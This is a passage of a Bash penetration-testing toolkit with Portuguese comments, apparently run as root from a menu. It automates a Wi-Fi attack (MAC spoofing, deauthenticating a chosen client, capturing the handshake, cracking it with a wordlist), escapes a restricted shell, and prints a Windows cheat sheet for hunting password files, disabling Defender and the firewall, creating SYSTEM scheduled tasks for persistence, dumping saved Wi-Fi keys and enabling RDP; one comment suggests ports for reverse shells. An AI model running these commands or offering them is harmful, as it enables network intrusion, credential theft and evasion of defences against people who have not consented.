                # Tilix está instalado, abrir uma nova sessão do Tilix
                tilix --action=app-new-window "${man_comando}"
            else
                # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
                if command -v gnome-terminal &> /dev/null; then
                    # Ubuntu (Gnome Terminal)
                    gnome-terminal -- "${man_comando}"
                elif command -v xfce4-terminal &> /dev/null; then
                    # Xubuntu (Xfce Terminal)
                    xfce4-terminal --execute "${man_comando}"
                elif command -v konsole &> /dev/null; then
                    # KDE (Konsole)
                    konsole --hold -e "${man_comando}"
                elif command -v xterm &> /dev/null; then
                    # Terminal genérico (xterm)
                    xterm -e "${man_comando}"
                else
                    # Nenhum terminal padrão encontrado
                    echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
                    exit 1
                fi
            fi
        }

        # Definição da função verifica_comandos_instalados
        function verifica_comandos_instalados () {
            # Verificar se o Vim está instalado e acessível
            if command -v vim &> /dev/null; then
                # Executar função para escapar do rbash com Vim
                vim_escape_rbash;
            else
                # Verificar se o Find está instalado e acessível
                if command -v find &> /dev/null; then
                    # Executar função para escapar do rbash com Find
                    find_escape_rbash;
                # Verificar se o Man está instalado e acessível
                elif command -v man &> /dev/null; then
                    # Executar função para escapar do rbash com Man
                    man_escape_rbash;
                else
                    # Nenhum dos comandos necessários está instalado
                    echo "O script não é capaz de sair do rbash"    
                fi
            fi   
        }

        # Definição da função principal main_tec_esc_rbash
        function main_tec_esc_rbash(){
            # Chamar função para verificar comandos instalados e escapar do rbash
            verifica_comandos_instalados;
            pausa_script;
        }

        # Chamar função principal
        main_tec_esc_rbash

    }

    # Este script realiza testes de penetração em redes wireless
    function xviii_wifi_atk(){
        ##############################################################
        #
        #           Wireless Pentest 
        #
        #           AUTOR: Z1GSN1FF3R||R3v4N||0wL 
        #
        #           DATA: 01-27-2021
        #           REFATORADO: 04-22-2024    
        #   
        #           DESCRIÇÃO: Este script realiza testes de penetração em redes wireless.
        #
        #
        ##############################################################
        
        # Função para executar configurações preliminares antes do ataque
        function pre_configuracoes(){
            # Descrição: Desliga a interface 'mon0' do modo monitor.

            airmon-ng stop mon0

            # Explicação:

            # O comando `airmon-ng stop mon0` desativa a interface 'mon0' do modo monitor. 
            # Isso é necessário para que a interface possa ser usada para outras finalidades, como se conectar a uma rede Wi-Fi.
            # É importante notar que este comando pode falhar se a interface 'mon0' não estiver ativa no modo monitor.

            # Observações:

            # Certifique-se de que a interface 'mon0' esteja ativa no modo monitor antes de executar este comando.
            # Se o comando falhar, tente verificar o status da interface com o comando `airmon-ng check`.
        }

        # Função para mostrar as interfaces wireless disponíveis e configurar a interface para o modo monitor
        function interfaces_disponiveis(){
            clear
            #if #TODO: ADC UMA CHECAGEM IF AQUI PARA VERIFICAR A INTERFACE WIFI
            #echo ""
            #echo "=========== IW DISPONIVEIS ============="
            #airmon-ng
            #echo "=========== MONITOR MODE ============="
            #read -p "Interface Wireless para entrar em modo monitor: " INTERFACE
            #echo "======================================"
            #echo ""
        }        

        # Função para realizar as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
        function configuracoes_iniciais(){
            # Desativa a interface de rede
            ifconfig "${INTERFACE}" down

            # Adiciona uma nova interface em modo monitor chamada mon0
            iw dev "${INTERFACE}" interface add mon0 type monitor

            # Altera o endereço MAC da interface mon0
            macchanger -r mon0

            # Verifica se há processos em execução que podem interferir e os encerra
            airmon-ng check kill #kill the process that maybe cause some problem

            # Solicita ao usuário para pressionar ENTER para continuar
            echo -e "${GRAY} Pressione ENTER para continuar${RESET}" && read -r 2> /dev/null
        }

        # Função para iniciar o monitoramento em modo promíscuo
        function monitoramento_promiscuo(){
            # Obtém o timestamp atual para nomear o arquivo de log
            local timestamp
            timestamp=$(date +"%d%H%M%b%y")    

            # Executa o comando airodump-ng para iniciar o monitoramento em modo promíscuo e escrever os resultados em um arquivo de log com o timestamp no nome
            airodump-ng mon0 --write monitoramento_promiscuo_log"$timestamp"
        }

        # Função para escanear o Access Point (AP) alvo e escrever os resultados em um arquivo de log
        function scan_ap_alvo(){    
            echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal
            echo "============================================"

            # Solicita ao usuário o BSSID (MAC do AP) do alvo
            read -r -p "BSSID (MAC do AP) do alvo: " MACTARGET

            # Solicita ao usuário o canal do AP
            read -r -p "Canal do AP: " CHANNEL #TODO: ADC TRATAMENTO PARA FILTRAR O CANAL DO AP LOGO APÓS A INSERÇÃO DO BSSID

            echo "============================================"
            echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal

            # Executa o comando airodump-ng para escanear o AP alvo, utilizando o BSSID e o canal fornecidos pelo usuário, e escreve os resultados em um arquivo de log
            airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write scan_ap_alvo_log
        }

        # Função para capturar o handshake de autenticação entre o cliente e o AP alvo
        function captura_4whsk(){
            # Abre uma nova sessão do Tilix e executa o comando airodump-ng para capturar o handshake de autenticação entre o cliente e o AP alvo.
            # Os resultados são escritos em um arquivo de log chamado captura_4whsk_log.
            # O redirecionamento "> /dev/null 2>&1" é utilizado para suprimir a saída padrão e de erro do comando, e o processo é executado em segundo plano "&".
            tilix --action=app-new-window -e airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write captura_4whsk_log > /dev/null 2>&1 &
        }

        # Função para realizar um ataque de desautenticação (deauth) no cliente especificado
        function ataque_deauth(){  
            echo ""
            echo "============================================"
            read -r -p "MAC do cliente para ser desconectado: " CLNTMAC
            echo "============================================"
            echo ""
            # Deauth no cliente
            for ((i=1;i<=3;i++)); do
                # Executa o comando aireplay-ng para realizar o ataque de desautenticação.
                # A opção "--deauth=5" indica o número de pacotes de desautenticação a serem enviados.
                # Os parâmetros "-a" e "-c" especificam o endereço MAC do AP alvo e do cliente, respectivamente.
                # A saída do comando é salva em um arquivo de log chamado ataque_deauth.log, utilizando o comando "tee -a".
                aireplay-ng --deauth=5 -a "$MACTARGET" -c "$CLNTMAC" mon0 | tee -a ataque_deauth.log
                # Mensagem para informar o intervalo entre os ataques de desautenticação
                echo "Intervalo de 5s entre um ataque e outro de Deauth. Aperte Ctrl+C para cancelar após a captura do 4-way-handshake"
                if [ $i -lt 3 ]; then #TODO:VERIFICAR NECESSIDADE DESSE IF
                    sleep 5
                fi
            done
        }

        # Função para quebrar a senha usando um dicionário de palavras
        function quebra_senha_dicionario(){
            aircrack-ng captura_4whsk_log*.cap -w /usr/share/wordlists/rockyou.txt
        }

        # Função principal para executar todas as etapas do ataque
        function main_wifi_atk(){
            # Executa as configurações pré-ataque
            pre_configuracoes;
            # Verifica as interfaces disponíveis
            interfaces_disponiveis;
            # Realiza as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
            configuracoes_iniciais;
            # Inicia o monitoramento em modo promíscuo
            monitoramento_promiscuo;
            # Escaneia o AP alvo e grava os resultados em um arquivo de log
            scan_ap_alvo;
            # Captura o handshake de autenticação entre o cliente e o AP alvo
            captura_4whsk;
            # Realiza um ataque de desautenticação no cliente especificado
            ataque_deauth;
            # Tenta quebrar a senha utilizando um dicionário
            quebra_senha_dicionario;
            # Mensagem para pressionar ENTER para continuar
            echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
            read -r 2> /dev/null
            # Chamada da função principal do menu principal após pressionar ENTER
            main_menu;  
        }

        # Chama a função principal
        main_wifi_atk;

    }

    #
    function xix_cmd_basicos_windows(){
        clear
        echo -e ""
        function comandos_basicos() {
            echo -e "${WHITE}############################## COMANDOS BÁSICOS ##############################${RESET}"
            echo -e "${RED}help ${GRAY}# Mostra os comandos disponíveis.${RESET}"
            echo -e "${RED}help <comando> OR <comando> /? ${GRAY}# Mostra a ajuda para utilizar determinado comando.${RESET}"
            echo -e ""
            echo -e "${RED}cls ${GRAY}# Serve para limpar a tela do terminal em uso${RESET}"
        }
        function dir_cmd(){
            echo -e "${WHITE}################### DIR #######################${RESET}"
            echo -e "${RED}dir ${GRAY}# Serve para listar os arquivos presentes no diretório atual.${RESET}"
            echo -e "${RED}dir /a ${GRAY}# Lista inclusive arquivos ocultos${RESET}"
            echo -e ""
        }
        function gamb_dir2find(){
            echo -e "${WHITE}############### GAMBIARRA SEMELHANTE AO FIND #################${RESET}"
            echo -e "${RED}dir /s /a /b *pass* == *cred* == *vnc* == *unatt* == *.config* ${GRAY}# Busca por arquivos que contenham o nome especificado, a partir do diretório atual. (observação: '==' é equivalente a 'or')${RESET}"
            echo -e ""
        }
        function cd_cmd(){
            echo -e "${WHITE}################### CD #######################${RESET}"
            echo -e "${RED}cd <diretorio> ${GRAY}# Serve para navegar entre os diretórios do Windows.${RESET}"
            echo -e "${RED}cd .. ${GRAY}# Navegar para um diretório acima do diretório atual${RESET}"
            echo -e "${RED}cd ${GRAY}# Mostra qual o diretório atual (semelhante ao \"pwd\" do linux)${RESET}"
            echo -e ""
            echo -e "${RED}md ${GRAY}# Serve para criar um novo diretório.${RESET}"
            echo -e ""
        }
        function rd_cmd(){
            echo -e "${WHITE}################### RD #######################${RESET}"
            echo -e "${RED}rd ${GRAY}# Serve para deletar um diretório.${RESET}"
            echo -e "${RED}rd /s ${GRAY}# modo recursivo${RESET}"
            echo -e "${RED}rd /q ${GRAY}# (quiet, sem pedir confirmação)${RESET}"
            echo -e ""
            echo -e "${RED}type ${GRAY}# Exibe o conteúdo, em formato de texto, de um arquivo.${RESET}"
            echo -e ""
            echo -e "${RED}ren <nome_antigo> <nome_novo> ${GRAY}# Renomear determinado arquivo ou diretório.${RESET}"
            echo -e ""
        }
        function xcopy_cmd(){
            echo -e "${WHITE}################### XCOPY #######################${RESET}"
            echo -e "${RED}xcopy <arquivo_original> <nome_da_copia> ${GRAY}# Faz a cópia de arquivos/diretórios. Porém não copia os subdiretórios.${RESET}"
            echo -e ""
            echo -e "${RED}xcopy /e <original> <copia> ${GRAY}# Copia inclusive subdiretórios.${RESET}"
            echo -e "${RED}xcopy /s <original> <copia> ${GRAY}# Copia inclusive subdiretórios, exceto os subdiretórios vazios.${RESET}"
            echo -e ""
            echo -e ""
            echo -e "${RED}del ${GRAY}# Deleta um arquivo e/ou diretório${RESET}"
            echo -e ""
            echo -e ""
            echo -e "${RED}move <origem> <destino> ${GRAY}# Move um arquivo/diretório de um local para outro.${RESET}"
            echo -e ""
        }
        function whoami_cmd(){
            echo -e "${WHITE}################### WHOAMI #######################${RESET}"
            echo -e "${RED}whoami ${GRAY}# Mostra o nome de usuário e domínio atual.${RESET}"
            echo -e "${RED}whoami /priv ${GRAY}# Mostra os privilégio do usuário.${RESET}"
            echo -e ""
        }
        function tree_cmd(){
            echo -e "${WHITE}################### TREE #######################${RESET}"
            echo -e "${RED}tree ${GRAY}# Lista o diretório atual e todos os seus subdiretórios.${RESET}"
            echo -e "${RED}tree <diretorio> ${GRAY}# Lista o diretório informado e todos os seus subdiretórios${RESET}"
            echo -e "${RED}tree /f ${GRAY}# Lista o diretório atual, assim como todos os seus subdiretórios e arquivos.${RESET}"
            echo -e ""
        }
        function shutdown_cmd(){
            echo -e "${WHITE}################### SHUTDOWN #######################${RESET}"
            echo -e "${RED}shutdown ${GRAY}# Desligar/ reiniciar o sistema.${RESET}"
            echo -e "${RED}shutdown /s ${GRAY}# Desligar${RESET}"
            echo -e "${RED}shutdown /l ${GRAY}# fazer logoff${RESET}"
            echo -e "${RED}shutdown /r ${GRAY}# reiniciar${RESET}"
            echo -e "${RED}shutdown /f ${GRAY}# executar shutdown sem avisar o usuário (Força fechamento dos programas em execução)${RESET}"
            echo -e "${RED}shutdown /c \"comentario\" ${GRAY}# aparece um aviso para o usuário antes de fazer o desligamento.${RESET}"
            echo -e ""
        }
        function outros(){
            echo -e "${WHITE}################### OUTROS #######################${RESET}"
            echo -e "${RED}> ${GRAY}# Direciona a saída de um comando para um arquivo (substituindo o conteúdo do arquivo).${RESET}"
            echo -e "${RED}>> ${GRAY}# Direciona a saída de um comando para o conteúdo de um arquivo (Adiciona o conteúdo do arquivo).${RESET}"
            echo -e ""
            echo -e "${RED}sort arquivo.txt ${GRAY}# Exibe o conteúdo do arquivo especificado, na ordem alfabética (Apenas exibe, não modifica o conteúdo do arquivo).${RESET}"
            echo -e "${RED}sort /r arquivo.tx ${GRAY}# Exibe o conteúdo do arquivo especificado, de maneira inversa à ordem alfabética (Apenas exibe, não modifica o conteúdo do arquivo).${RESET}"
            echo -e ""
            echo -e "${RED}type arquivo.txt | sort ${GRAY}# O comando sort é executado em cima do resultado do comando type.${RESET}"
            echo -e ""
            echo -e "${RED}2>nul ${GRAY}# Omite a saída de erros de um comando.${RESET}"
            echo -e ""
        }
        function findstr_cmd(){
            echo -e "${WHITE}################### FINDSTR #######################${RESET}"
            echo -e "${RED}findstr \"string\" <arquivo.txt> ${GRAY}# Exibe apenas as linhas do arquivo.txt que possuam a string especificada.${RESET}"
            echo -e "${RED}findstr /spin /c:\"password\" *.* 2>nul ${GRAY}# Procura, em todos os arquivos a partir do diretório atual, por arquivos que contenham a string especificada.${RESET}"
            echo -e ""
        }
        function attrib_cmd(){
            echo -e "${WHITE}################### ATTRIB #######################${RESET}"
            echo -e "${RED}attrib ${GRAY}# Exibe os atributos dos arquivos do diretório atual.${RESET}"
            echo -e "${RED}attrib /d ${GRAY}# Exibe os atributos dos arquivos e diretórios do diretório atual. ${RESET}"
            echo -e "${RED}attrib /s ${GRAY}# Exibe os atributos dos arquivos do diretório atual e dos arquivos nos subdiretórios.${RESET}"
            echo -e ""
            echo -e "${RED}attrib +S +H <arquivo> ${GRAY}# Deixa um arquivo oculto e não mostra esse arquivo, quando aberto pela interface gráfica, mesmo com a opção de "mostrar arquivos ocultos" estando ativa.${RESET}"
            echo -e ""
        }
        function cmd4enum_cmd(){
            echo -e "${WHITE}################### CMD 4 ENUM #######################${RESET}"
            echo -e "${RED}dir /s /a /b *pass* == *cred* == *vnc* == *unatt* == *.config*${RESET}"
            echo -e "${RED}tree /f${RESET}"
            echo -e "${RED}findstr /spin /c:\"password\" *.* 2>null${RESET}"
            echo -e ""
        }
        function icalcs(){
            echo -e "${WHITE}################### ICALCS #######################${RESET}"
            echo -e "${RED}ICACLS: —> Lista e gerencia as DACL (informações de permissão) das pastas/arquivos.${RESET}"
            echo -e ""
            echo -e "${GRAY}Exemplo:${RESET}"
            echo -e "${BLUE}> icacls \"arquivo 2.txt\"${RESET}"
            echo -e "${GRAY}#arquivo 2.txt AUTORIDADE NT\SISTEMA:(I)(F) -- SYSTEM${RESET}"
            echo -e "${GRAY}#              BUILTIN\Administradores:(I)(F) -- USUARIOS ADMIN${RESET}"
            echo -e "${GRAY}#              DESKTOP-JPMQF3L\aluno:(I)(F) -- USUARIO aluno MAQUINA JPMQF3L${RESET}"
            echo -e ""
            echo -e "${RED}icacls arquivo /grant aluno:F ${GRAY}# Adicionar permissões${RESET}"
            echo -e ""
            echo -e "${RED}icacls arquivo /deny aluno:F ${GRAY}# Negar permissões${RESET}"
            echo -e ""
            echo -e "${RED}whoami /groups ${GRAY}# Verificar o nível de integridade${RESET}"
        }
        function system_info(){
            echo -e ""
            echo -e "${WHITE}################### INFORMAÇOES DO SISTEMA #######################${RESET}"
            echo -e "${RED}hostname ${GRAY}# Exibe o nome do host${RESET}"
            echo -e ""
            echo -e "${RED}netstat -ano ${GRAY}# Mostra serviços com portas e conexões ativas.${RESET}"
            echo -e ""
            echo -e "${RED}ver ${GRAY}# Exibe a build do sistema${RESET}"
            echo -e ""
            echo -e "${RED}systeminfo ${GRAY}# Exibe informações do sistema${RESET}"
            echo -e ""
            echo -e "${RED}winver ${GRAY}# Exibe a versão, build e SO.${RESET}"
            echo -e ""
        }
        function processos_gerenciamento(){
            echo -e "${WHITE}################### GERENCIAMENTO DE PROCESSOS #######################${RESET}"
            echo -e "${GRAY}Processo corresponde a uma instância de um programa, ou seja, um programa que está sendo executado no sistema operacional, consumindo recursos.${RESET}"
            echo -e ""
            echo -e "${RED}wmic product get name,version,installlocation ${GRAY}# Lista os programas instalados no sistema, assim como suas versões e locais onde estão instalado.${RESET}"
            echo -e ""
            echo -e "${RED}tasklist ${GRAY}# Lista os processos ativos, nomes, PID, etc...${RESET}"
            echo -e "${RED}tasklist /M ${GRAY}# lista as DLL que cada processo usa${RESET}"
            echo -e "${RED}tasklist /SVC ${GRAY}# lista os serviços relacionados com esse processo${RESET}"
            echo -e "${RED}tasklist /V ${GRAY}# Mostra qual usuário está utilizando determinado processo${RESET}"
            echo -e ""
            echo -e "${RED}taskkill /pid xxxx /f ${GRAY}# Mata determinado processo ativo (Ex: taskkill /pid 3395).${RESET}"
            echo -e ""
        }
        function usuarios_gerenciamento(){
            echo -e "${WHITE}################### GERENCIAMENTO DE USUARIOS #######################${RESET}"
            echo -e "${RED}net user ${GRAY}# Listar usuários da maquina${RESET}"
            echo -e "${RED}net user <usuario> ${GRAY}# Ver detalhes do usuário (grupos, etc)${RESET}"
            echo -e "${RED}net localgroup ${GRAY}# Lista grupos existentes na máquina${RESET}"
            echo -e "${RED}net localgroup <nome_do_grupo> ${GRAY}# Ver quais usuários estão em determinado grupo${RESET}"
            echo -e "${RED}net user <novo_usuario> <nova_senha> /add ${GRAY}# Criar novo usuário${RESET}"
            echo -e "${RED}net user <usuario> /del ${GRAY}# Remover o usuário especificado ${RESET}"
            echo -e "${RED}net localgroup <nome_do_grupo> <nome_do_usuario> /add ${GRAY}# Adicionar o usuário especificado no grupo especificado${RESET}"
            echo -e "${RED}net localgroup <nome_do_grupo> <nome_do_usuario> /del ${GRAY}# Remover o usuário especificado no grupo especificado ${RESET}"
            echo -e "${RED}net user <usuario> <nova_senha> ${GRAY}# Alterar senha de um usuário${RESET}"
            echo -e "${RED}net user <usuario> /active:yes ${GRAY}# Habilitar ou desabilitar usuário (yes ou no)${RESET}"
            echo -e ""
        }
        function firewall_gerenciamento(){
            echo -e "${WHITE}################### GERENCIAMENTO DE FIREWALL #######################${RESET}"
            echo -e "${RED}netsh advfirewall show currentprofile ${GRAY}# Mostra o status do firewall (apenas o perfil ativo)"
            echo -e "${RED}netsh advfirewall set allprofiles state off ${GRAY}# Desabilita o firewall do Windows."
            echo -e "${RED}netsh advfirewall set allprofiles state on ${GRAY}# Habilita o firewall do Windows."
            echo -e "${RED}netsh advfirewall firewall add rule name=\"nome_da_regra\" dir=in action=allow protocol=tcp program=\"C:\caminho\programa.exe\" enable=yes ${GRAY}# Permitir que um programa especifico no echo -e firewall."
            echo -e "${RED}netsh advfirewall firewall add rule name=\"nome_da_regra\" dir=in action=allow protocol=tcp localport=4444 enable=yes ${GRAY}# Abrir a porta especificada no firewallecho -e "
            echo -e ""
            echo -e "${GRAY}# dir = in | out"
            echo -e "${GRAY}# action = allow|block"
            echo -e "${GRAY}# protocol = TCP | UDP |any"
            echo -e "${GRAY}# Obs: As portas 80 e 443 costumam estar abertas para conexões de saída. Interessante tentar utilizar essas portas para obter um shell reverso."
            echo -e ""
        }
        function antivirus_gerenciamento(){
            echo -e "${WHITE}################### GERENCIAMENTO DE ANTIVIRUS #######################${RESET}"
            echo -e "${GRAY}Sequencia de comandos para tentar desabilitar o Windows defender, utilizando o powershell. Não é necessário reiniciar a máquina. Mudar para ${GREEN} \$false ${RESET}${GRAY} caso queira reativar:${RESET}"
            echo -e ""
            echo -e "${RED}powershell.exe Set-MpPreference -DisableRealTimeMonitoring \$true ${GRAY}# Desabilita o scan em tempo real${RESET}"
            echo -e ""
            echo -e "${GRAY}No Windows a partir da ${GREEN}build 18305, a proteção contra violações do Windows defender deve estar desativada.${RESET}${GRAY} Para verificar se a proteção contra violações está ativa, use o comando:"
            echo -e ""
            echo -e "${RED}powershell.exe Get-MpComputerStatus${RESET}"
            echo -e ""
            echo -e "${GRAY}Na saída do comando acima, ${RED}procurar por \"IsTamperProtected\". Caso esteja como true, não será possível desabilitar o Windows defender via terminal.${RESET}"
            echo -e ""
        }
        function tarefas_agendadas_gerenciamento(){
            echo -e "${WHITE}################### GERENCIAMENTO DE TAREFAS AGENDADAS #######################${RESET}"
            echo -e ""
            echo -e "${RED}schtasks /query /v /fo list ${GRAY}# Lista as tarefas agendadas disponíveis no sistema. Filtrar saída com findstr para buscar algo especifico.${RESET}"
            echo -e "${RED}schtasks /query /v /fo list | findstr /L \".exe\" ${GRAY}# Exemplo${RESET}"
            echo -e "${RED}schtasks /query /v /fo list | findstr /L \".bat\" ${GRAY}# Exemplo${RESET}"
            echo -e ""
            echo -e "${RED}schtasks /create /tn \"nome_da_tarefa\" /tr \"path_do_script_ou_exe\" /sc \"minute\" /RU \"dominio\usuário\" /RP \"senha_do_usuário\" ${GRAY}# Criar uma tarefa agendada, que será executada pelo usuário especificado, a cada minuto.${RESET}"
            echo -e ""
            echo -e "${RED}schtasks /create /tn \"nome_da_tarefa\" /tr \"path_do_script_ou_exe\" /sc \"minute\" /RU \"system\" ${GRAY}# Criar uma tarefa agendada, que será executada pelo usuário system, a cada minuto (Precisa ser executado por um terminal com privilégio [obter persistência após explorar um alvo]).${RESET}"
            echo -e ""
            echo -e "${RED}schtasks /run /I /TN \"nome_da_tarefa_agendada\" ${GRAY}# Executar imediatamente determinada tarefa agendada. ${RESET}"
            echo -e "${RED}schtasks /delete /tn \"nome_da_tarefa\" ${GRAY}# Deletar uma tarefa agendada.${RESET}"
            echo -e "${RED}schtasks /delete /tn \"windowsupdate\"${RESET}"
            echo -e ""
        }
        function servicos_gerenciamento(){
            echo -e "${WHITE}################### GERENCIAMENTO DE SERVIÇOS #######################${RESET}"
            echo -e ""
            echo -e "${RED}sc query ${GRAY}# lista os serviços ativos.${RESET}"
            echo -e "${RED}sc query state= all ${GRAY}# Lista todos os serviços${RESET}"
            echo -e ""
            echo -e "${RED}wmic service get name,pathname,startmode,startname ${GRAY}# Mostra os serviços, com alguns filtros${RESET} "
            echo -e ""
            echo -e "${RED}sc query state= all | findstr \"NOME_DO_SERVIÇO\" ${GRAY}# Lista apenas os nomes dos serviços (Para Windows em português)${RESET}"
            echo -e ""
            echo -e "${RED}sc create \"nome_do_serviço\" binPath= \"caminho_do_executável\" DisplayName= \"descrição_do_serviço\" start= \"auto\" obj= \".\ LocalSystem\" ${GRAY}# Criar um novo serviço, que será executado pelo usuário system.${RESET}"
            echo -e "${YELLOW}${BG_BLACK}###############################################################${RESET}"
            echo -e "${YELLOW}${BG_BLACK}##### - Atenção para o espaço após os sinais de " = " !!! ######${RESET}"
            echo -e "${YELLOW}${BG_BLACK}###############################################################${RESET}"
            echo -e ""
            echo -e "${RED}sc qc <nome_do_servico> ${GRAY}# Mostra configurações e informações de um serviço.${RESET}"
            echo -e "${RED}sc start <nome_do_servico> ${GRAY}# Inicia um serviço${RESET}"
            echo -e "${RED}sc stop <nome_do_servico> ${GRAY}# Para um serviço${RESET}"
            echo -e "${RED}sc delete \"nome_do_serviço\" ${GRAY}# Exclui um serviço${RESET}"
            echo -e "${RED}sc config <nome_do_servico> binPath= <novo_caminho_do_executavel> ${GRAY}# Exemplo de comando para mudar o caminho do executável que o serviço executa.${RESET}"
            echo -e ""
        }
        function extracao_senhas(){
            echo -e "${WHITE}################### EXTRAÇÃO DE SENHAS #######################${RESET}"
            echo -e ""
            echo -e "${RED}netsh wlan show profiles ${GRAY}# Mostra as redes wi-fi que estão salvas na maquina.${RESET}"
            echo -e "${RED}netsh wlan show profiles name=\"nome_da_rede\" key=clear ${GRAY}# Exibe algumas informações da rede wi-fi salva, inclusive a senha em claro.${RESET}"
            echo -e ""

        }
        function registros_windows(){
            echo -e "${WHITE}################### REGISTRO DO WINDOWS #######################${RESET}"
            echo -e "${RED}HKEY_CLASSES_ROOT (HKCR)${GRAY}: Presente nas versões atuais do Windows apenas para manter a compatibilidade com programas mais antigos.${RESET}"
            echo -e "${RED}HKEY_CURRENT_USER (HKCU)${GRAY}: Contém todas as configurações do usuário logado no sistema.${RESET}"
            echo -e "${RED}HKEY_LOCAL_MACHINE (HKLM)${GRAY}: Chave mais importante do registro, guarda todas as informações que o sistema operacional precisa para funcionar e de sua interface gráfica. Utiliza o arquivo SYSTEM para armazenar essas configurações.${RESET}"
            echo -e "${RED}HKEY_USERS (HKU)${GRAY}: Guarda as configurações de aparência do Windows e as configurações efetuadas pelos usuários, como papel de parede, protetor de tela, temas e outros.${RESET}"
            echo -e "${RED}HKEY_CURRENT_CONFIG (HKCC)${GRAY}: Salva os perfis de hardware utilizados pelo usuário.${RESET}"
            echo -e "${RED}HKEY_LOCAL_MACHINE\Software\RegisteredApplications${GRAY} = subchave \"RegisteredApplications\" da subchave \"Software\" da chave HKEY_LOCAL_MACHINE.${RESET}"
            echo -e ""
            echo -e "${YELLOW}Através do registro do Windows, é possível mudar o comportamento padrão de alguns programas do Sistema Operacional, assim como é possível conseguir algumas informações importantes, como versão de programas, senhas, etc${RESET}"
            echo -e "${GRAY}Exemplos:"
            echo -e "   ${RED}\"HKLM\SOFTWARE\RealVNC\WinVNC4\" /v password ${GRAY}# O programa RealVNC salva a senha criptografada no seguinte valor do registro${RESET}"
            echo -e "   ${RED}\"HKCU\Software\SimonTatham\PuTTY\" ${GRAY}# O programa PuTTY salva detalhes sobre conexões realizadas utilizando o programa, na seguinte subchave${RESET}"
            echo -e "   ${RED}\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections ${GRAY}# O windows utiliza o seguinte valor para habilitar/desabilitar o acesso remoto ao sistema${RESET}"
            echo -e ""
            echo -e "${YELLOW}REGISTRO DO WINDOWS - Interagindo via terminal${RESET}"
            echo -e "   ${RED}reg query chave\subchave\subchave\subchave ${GRAY}# Comando para ver os valores e subchaves contido no caminho especificado.${RESET} "
            echo -e "   ${RED}reg query \"HKLM\SOFTWARE\WinRAR\Capabilities\FileAssociations\" ${GRAY}# Exemplo${RESET}"
            echo -e "   ${RED}reg add <chave\subchave\subchave> ${GRAY}# Adicionar uma subchave no no registro"
            echo -e "   ${RED}reg add <chave\subchave\subchave> /v <nome_do_valor> /t <tipo> /d <dado> ${GRAY}# Adicionar um valor no registro.${RESET}"
            echo -e "   ${RED}reg delete <chave\subchave\subchave> ${GRAY}# Remover uma chave do registro${RESET}"
            echo -e "   ${RED}reg save <chave\subchave\subchave arquivo_de_saida> ${GRAY}# Copiar chaves/subchaves para um arquivo.${RESET}"
            echo -e ""
            echo -e ">>> !!! IMPORTANTE !!! <<<   ${RED}reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f ${GRAY}# Ao editar essa chave, o protocolo RDP fica ativado na maquina${RESET}"
        } 
        function main_cmd_basicos_windows(){
            comandos_basicos;
            dir_cmd;
            cd_cmd;
            rd_cmd;
            xcopy_cmd;
            whoami_cmd;
            tree_cmd;
            shutdown_cmd;
            findstr_cmd;
            gamb_dir2find;
            attrib_cmd;
            cmd4enum_cmd;
            icalcs;
            system_info;
            processos_gerenciamento;
            usuarios_gerenciamento;
            firewall_gerenciamento;
            antivirus_gerenciamento;
            tarefas_agendadas_gerenciamento
            servicos_gerenciamento;
            registros_windows;
            outros;
        }
        main_cmd_basicos_windows | tee comandos_windows.txt;
        echo "Arquivo comandos_windows.txt gerado para consultas"
        pausa_script;

        # Chamada da função principal do menu principal após pressionar ENTER
        main_menu;


    }

    #
    function xxii_nmap_descoberta_de_rede(){
        local rede
        rede="$(ipcalc -n -b -n -b "$(ip -br a | grep tap | head -n 1 | awk '{print $3}')" | awk '/Network/ {print $2}')"
        cd /usr/share/nmap/scripts && nmap -sC -sV -vv -O $rede | tee /home/kali/nmap.txt
        echo ""
        pausa_script;
    }

    #
    function xxiii_nmap(){
        echo "nmap"
    }

    #
    function xxiv_revshell_windows(){
        echo "revshell_windows"
    }

    #
    function xxv_rdp_windows(){
        echo -n "Insira o IP do host windows: "
        read -r  IP_HOST
        echo -n "Insira o usuario: "
        read -r USER
        echo -n "Insira o password: "
        read -r PASSWD
        tilix --action=app-new-session --command="$(xfreerdp /u:"$USER" /p:"$PASSWD" /w:1366 /h:768 /v:"$IP_HOST" /smart-sizing +auto-reconnect)"
    }
    #
    function xxvi_ssh_windows(){
        echo -n "Insira o IP do host windows: "
        read -r IP_HOST
        echo -n "Insira o usuario: "
        read -r USER
        echo -n "Insira o password: "
        read -r PASSWD
        ssh -p 3389 "$USER@$IP_HOST"
    }
    #


#* ====== CHECKING PARAMETERS AND EXECUTING THE MAIN ======
    # Checks if the number of arguments passed to the script is non-zero.
    # Check if the script is being run with root privileges 
    # If not, display an error message and exit with a non-zero status code 
    # Check if the script is run as root
    if [ "$(id -u)" != "0" ]; then
        error_not_root  
        exit 1  
    fi
    #! TODO: FIXME! Handle command-line arguments (fast mode)
    if [[ -n "$1" ]]; then
        case "$1" in
            -h|--help)
                show_help
                exit 0
                ;;
            ''|*[!0-9]*)  # Reject non-numeric inputs
                echo -e "${RED}Invalid input. Use a number or '-h' for help.${RESET}"
                exit 1
                ;;
            *)
                option=$((10#$1))  # Convert argument to integer
                if validate_input "$option"; then
                    process_menu_option "$option"  # Run the chosen function immediately
                    exit 0
                else
                    echo -e "${RED} Invalid option: $option. Run './0wl.sh -h' for help.${RESET}"
                    exit 1
                fi
                ;;
        esac
    fi

    # No arguments provided: Run interactive menu
    enable_proxychains  # Enable proxychains at script start
    main  # Run interactive mode




